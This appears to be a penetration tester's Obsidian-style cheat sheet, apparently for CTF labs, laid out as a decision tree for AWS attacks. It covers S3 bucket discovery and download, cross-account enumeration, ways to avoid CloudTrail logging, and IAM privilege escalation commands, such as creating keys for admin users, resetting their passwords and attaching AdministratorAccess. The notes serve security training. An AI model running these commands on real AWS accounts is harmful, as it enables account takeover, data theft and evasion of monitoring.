# Cloud Enumeration — Decision Tree

Part of [[DECISION TREE]]. "I found X, what do I try" lookup for AWS cloud enumeration. For syntax see [[Cloud Enumeration]] (Command Appendix). For phase-ordered workflow see [[Cloud Methodology]].

#AWS #Cloud #IAM #S3 #DecisionTree

---

## I know the target domain and suspect cloud hosting

```
host -t ns <domain>
        │
        ├── awsdns-*.co.uk/net/com/org → Route53 (AWS)
        │       └── host www.<domain> → check IP
        │                   └── host <ip> → ec2-* PTR → confirmed EC2
        │
        ├── azure-dns.com → Azure
        └── ns-cloud-*.googledomains.com → GCP

On Route53 confirmed:
    └── dig TXT <domain> @<dns_ip>
            └── non-standard string in SPF/TXT record → potential flag/data hidden there

    └── dnsenum <domain> --threads 100
            └── zone transfer fails (expected on Route53)
            └── subdomains discovered via brute force → enumerate each

    └── browse www.<domain> → DevTools Network tab
            └── filter s3.amazonaws.com requests
            └── extract bucket name from URL
```

---

## I found an S3 bucket URL

```
curl "https://s3.amazonaws.com/<bucket>/"
        │
        ├── XML listing → OPEN bucket (public read)
        │       └── download all files: aws s3 cp s3://<bucket>/ /tmp/ --recursive
        │
        ├── AccessDenied → bucket exists but private
        │       └── try direct object access anyway (listing ≠ object access)
        │               aws s3 cp s3://<bucket>/proof.txt - 2>/dev/null
        │               └── success → object is public even though bucket listing is blocked
        │
        └── NoSuchBucket → bucket doesn't exist (bad name or wrong region)
                └── try us-west-2, eu-west-1 etc.

Naming convention guessing:
    Known bucket: <org>-assets-public-<suffix>
    └── extract <suffix> from known URL
    └── try: <org>-<keyword>-<suffix> with keyword wordlist (gemstones, projects, envs)
    └── aws s3 cp s3://<org>-${kw}-<suffix>/proof.txt - 2>/dev/null

Automated:
    cloud_enum -kf /tmp/keyfile.txt -qs --disable-azure --disable-gcp
```

---

## I need to enumerate resources in another AWS account (no creds in target)

```
Do I have a known public resource (AMI/snapshot/S3 bucket) from the target?
        │
        ├── YES: AMI or public snapshot
        │       └── aws ec2 describe-images --executable-users all --filters "Name=name,Values=*<keyword>*"
        │               └── OwnerId = target's account ID
        │
        ├── YES: publicly readable S3 object
        │       └── Use s3:ResourceAccount StringLike oracle (Nick Frichette technique)
        │               → binary-search account ID one digit at a time
        │               → zero traces in target's CloudTrail
        │
        └── I want to enumerate IAM users/roles cross-account
                └── Use IAM trust policy oracle (Pacu iam__enum_roles)
                        pacu → import_keys <attacker_profile>
                        run iam__enum_roles --account-id <target_acct> --word-list /tmp/names.txt
                        MalformedPolicy = doesn't exist
                        Success + credentials = exists AND assumable
```

---

## I have compromised AWS credentials — what first?

```
aws sts get-caller-identity --profile <compromised>
        └── note UserId, Account, Arn (username + path)

Scope permissions:
        aws iam list-user-policies + list-attached-user-policies (direct)
        aws iam list-groups-for-user → list-group-policies per group (inherited)
        │
        ├── Have iam:GetAccountAuthorizationDetails?
        │       └── aws iam get-account-authorization-details --filter User Group LocalManagedPolicy > /tmp/iam.json
        │               └── analyse with jq (see Command Appendix — Cloud Enumeration)
        │
        └── No IAM read? → try EC2 describe actions to find tagged resources
                aws ec2 describe-vpcs --profile <compromised>    → check Tags for proof/flag
                aws ec2 describe-instances --profile <compromised>
                aws ec2 describe-tags --profile <compromised>    → often more restricted

Reduce noise / evade logging:
        aws sts get-access-key-info --access-key-id AKIA...    (logs in YOUR account, not target's)
        Use --region us-east-2 to log events outside the monitored region
        Lambda invoke nonexistent function → identity from error, data event (not default logged)
```

---

## I found a dangerous IAM permission — what can I escalate to?

```
iam:CreateAccessKey on Resource:*
        → CreateAccessKey for any user (including admins)
        → aws iam create-access-key --user-name <admin-user> --profile <compromised>
        → configure new profile with those keys → full admin

iam:CreateLoginProfile / iam:UpdateLoginProfile on Resource:*
        → Set or reset console password for any user
        → aws iam update-login-profile --user-name <admin> --password NewPass1! --no-password-reset-required

iam:AttachUserPolicy on Resource:*
        → Attach AdministratorAccess to yourself
        → aws iam attach-user-policy --user-name <self> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

iam:PutUserPolicy on Resource:*
        → Create inline admin policy on yourself
        → aws iam put-user-policy --user-name <self> --policy-name admin --policy-document '{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'

iam:CreatePolicyVersion + iam:SetDefaultPolicyVersion
        → Create a new version of an existing managed policy with Action:* Resource:*
        → Set it as default → all users/roles attached to that policy now have admin

iam:PassRole + ec2:RunInstances / lambda:CreateFunction
        → Launch EC2/Lambda with an admin role attached
        → Steal credentials from instance metadata or invoke to escalate

ABAC tag confusion (any iam:* scoped by tag condition):
        → Find a tag-scoped policy: select(.Condition.StringEquals."aws:ResourceTag/Project" != null)
        → Find admin users tagged with that project name
        → If admin user has the project tag → full IAM access to that user (CreateAccessKey etc.)
```

---

## I assumed a role — what can I access?

```
aws sts get-caller-identity --profile <assumed-role-profile>
        └── confirm AssumedRoleUser ARN

aws ec2 describe-vpcs --profile <assumed-role-profile> --no-cli-pager
        └── check Tags array on each VPC for proof/flag keys

aws ec2 describe-instances --profile <assumed-role-profile> --no-cli-pager

aws iam get-account-authorization-details --filter User Group LocalManagedPolicy \
  --profile <assumed-role-profile> > /tmp/iam-as-role.json
        └── may see more than the original credentials could see
        └── look for additional privesc paths from the role's perspective
```
